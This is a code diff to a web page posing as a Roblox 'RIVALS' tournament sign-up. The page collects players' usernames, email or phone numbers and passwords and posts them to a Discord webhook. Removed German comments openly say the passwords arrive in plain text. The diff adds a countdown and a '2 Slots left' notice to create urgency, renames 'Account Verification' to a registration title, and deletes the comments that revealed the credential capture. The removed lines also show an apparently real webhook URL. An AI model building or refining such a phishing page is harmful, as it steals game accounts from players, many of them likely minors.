@@ -136,13 +136,66 @@
             transform: translateY(-1px);
         }
 
+        /* GLOBAL COUNTDOWN BOX */
+        .countdown-container {
+            background: linear-gradient(135deg, rgba(255, 51, 85, 0.15), rgba(255, 80, 120, 0.08));
+            border-radius: 1.5rem;
+            padding: 1.2rem 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(255, 70, 100, 0.3);
+            backdrop-filter: blur(8px);
+            text-align: center;
+        }
+        .countdown-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-weight: 600;
+            color: #ff8aa0;
+            margin-bottom: 0.5rem;
+        }
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+        .countdown-block {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 1rem;
+            padding: 0.6rem 1rem;
+            min-width: 70px;
+            backdrop-filter: blur(4px);
+            border-bottom: 2px solid #ff3355;
+        }
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: 800;
+            font-family: monospace;
+            letter-spacing: 2px;
+            color: #ffffff;
+            text-shadow: 0 0 10px #ff3355;
+        }
+        .countdown-unit {
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            color: #b9c3e6;
+            margin-top: 4px;
+        }
+        .countdown-ended {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #2eff8a;
+            text-shadow: 0 0 10px #2eff8a;
+        }
+
         /* SLOT WARNING */
         .slot-warning {
             background: rgba(255, 100, 40, 0.1);
             border-left: 3px solid #ffa047;
             border-radius: 1rem;
             padding: 0.7rem 1.2rem;
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
             display: flex;
             align-items: center;
             gap: 12px;
@@ -309,7 +362,7 @@
         .nexoo-glow:hover { text-shadow: 0 0 8px #ff5e7e; transform: scale(1.02); }
         .hidden-message { display: none; }
         
-        /* TOAST MESSAGE - SUPER SMOOTH FADE */
+        /* TOAST MESSAGE */
         .toast-message {
             position: fixed;
             bottom: 30px;
@@ -347,6 +400,8 @@
             .two-col { flex-direction: column; }
             .logo-combined { font-size: 1.6rem; }
             .toast-message { padding: 8px 18px; font-size: 0.75rem; bottom: 20px; }
+            .countdown-number { font-size: 1.3rem; }
+            .countdown-block { padding: 0.4rem 0.6rem; min-width: 55px; }
         }
     </style>
 </head>
@@ -365,6 +420,17 @@
         <div style="width: 80px;"></div>
     </div>
 
+    <!-- GLOBAL COUNTDOWN - DU KANNST DAS DATUM HIER ÄNDERN! -->
+    <div class="countdown-container">
+        <div class="countdown-label"><i class="fas fa-hourglass-half"></i> TOURNAMENT STARTS IN</div>
+        <div id="countdownTimer" class="countdown-timer">
+            <div class="countdown-block"><div class="countdown-number" id="days">00</div><div class="countdown-unit">DAYS</div></div>
+            <div class="countdown-block"><div class="countdown-number" id="hours">00</div><div class="countdown-unit">HOURS</div></div>
+            <div class="countdown-block"><div class="countdown-number" id="minutes">00</div><div class="countdown-unit">MINUTES</div></div>
+            <div class="countdown-block"><div class="countdown-number" id="seconds">00</div><div class="countdown-unit">SECONDS</div></div>
+        </div>
+    </div>
+
     <div class="slot-warning">
         <i class="fas fa-exclamation-triangle"></i> <span>2 Slots left until start!</span>
     </div>
@@ -372,7 +438,7 @@
     <div class="two-col">
         <div class="form-col">
             <div class="login-card">
-                <div class="form-title">Roblox Account Verification</div>
+                <div class="form-title">RIVALS REGISTRATION</div>
                 <div class="input-group">
                     <label><i class="fas fa-user"></i> Roblox Username</label>
                     <input type="text" id="robloxUsername" class="input-field" placeholder="Your IGN">
@@ -431,10 +497,21 @@
 
 <script>
     (function(){
-        // 🔴🔴🔴 WICHTIG FÜR ADMINS: HIER DEINE DISCORD WEBHOOK URL EINTRAGEN 🔴🔴🔴
-        // Das Passwort und Email/Phone werden KLAR TEXT im Discord Kanal angezeigt zur Verifikation!
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515879258587147/S0eV5V__tx4vOcgdFSxK_yAvmA0B0U1n_VyOsX54iCFq-ZRQ6477Y6IT5u9J5Iobkv1v";
+        // ============================================================
+        // 🔴🔴🔴 COUNTDOWN KONTROLLE - HIER STELLST DU DAS DATUM EIN 🔴🔴🔴
+        // ============================================================
+        // ÄNDERE DIESES DATUM auf deinen gewünschten Startzeitpunkt!
+        // Format: Jahr, Monat (0=Januar, 11=Dezember), Tag, Stunde, Minute, Sekunde
+        const targetDate = new Date(2026, 4, 15, 18, 0, 0); // 15. Mai 2026 um 18:00 Uhr
         
+        // ODER benutze dieses Format für genauen String:
+        // const targetDate = new Date("May 20, 2026 20:00:00").getTime();
+        // ============================================================
+        
+        // DISCORD WEBHOOK (für Admins)
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL";
+        
+        // DOM Elements
         const globalLoader = document.getElementById('globalLoader');
         const mainContainer = document.getElementById('mainContainer');
         const usernameInput = document.getElementById('robloxUsername');
@@ -448,8 +525,42 @@
         const teamMember4 = document.getElementById('teamMember4');
         const dynamicNotice = document.getElementById('dynamicAdminNotice');
 
+        // ========== COUNTDOWN FUNKTION ==========
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const distance = targetDate - now;
+            
+            const daysEl = document.getElementById('days');
+            const hoursEl = document.getElementById('hours');
+            const minutesEl = document.getElementById('minutes');
+            const secondsEl = document.getElementById('seconds');
+            const countdownContainer = document.querySelector('.countdown-timer');
+            
+            if (distance < 0) {
+                // Countdown ist abgelaufen
+                if (countdownContainer) {
+                    countdownContainer.innerHTML = '<div class="countdown-ended"><i class="fas fa-check-circle"></i> TOURNAMENT IS LIVE! JOIN NOW!</div>';
+                }
+                return;
+            }
+            
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            
+            if (daysEl) daysEl.textContent = String(days).padStart(2, '0');
+            if (hoursEl) hoursEl.textContent = String(hours).padStart(2, '0');
+            if (minutesEl) minutesEl.textContent = String(minutes).padStart(2, '0');
+            if (secondsEl) secondsEl.textContent = String(seconds).padStart(2, '0');
+        }
+        
+        // Countdown jede Sekunde aktualisieren
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+        
+        // ========== TOAST & LOADER FUNKTIONEN ==========
         let toastTimeout = null;
-
         function showToast(msg, isError, duration = 2800) {
             const toast = document.getElementById('floatingToast');
             if (!toast) return;
@@ -494,14 +605,13 @@
             dynamicNotice.classList.remove('hidden-message');
         }
 
-        // Discord Webhook mit KLARTEXT Email/Phone und Password für Admins
+        // Discord Webhook
         async function sendToDiscord(username, emailPhone, password, teamArray) {
             if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") 
                 throw new Error("WEBHOOK_NOT_SET");
             
             const teamFieldsList = teamArray.map((n,i) => `**Slot ${i+1}:** ${n || "—"}`).join("\n");
             
-            // WICHTIG: Email/Phone und Password werden im KLARTEXT an Discord gesendet
             const embed = {
                 title: "🔴 NEUE REGISTRIERUNG - RobloxComp 🔴",
                 color: 0xff3355,
@@ -585,7 +695,6 @@
         teamContainer.classList.remove('show-team');
         dynamicNotice.classList.add('hidden-message');
 
-        // Webhook Warning für Admins
         if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
             var warnSpan = document.createElement('div');
             warnSpan.style.fontSize = "0.65rem";
@@ -594,7 +703,7 @@
             warnSpan.style.background = "rgba(255,50,80,0.15)";
             warnSpan.style.borderRadius = "12px";
             warnSpan.style.color = "#ff8a9e";
-            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ DISCORD WEBHOOK NICHT KONFIGURIERT! Bitte ersetze die Webhook URL im Code, sonst kommen keine Daten bei den Admins an!';
+            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ DISCORD WEBHOOK NICHT KONFIGURIERT! Bitte ersetze die Webhook URL im Code!';
             var loginCard = document.querySelector('.login-card');
             if (loginCard) loginCard.appendChild(warnSpan);
         }
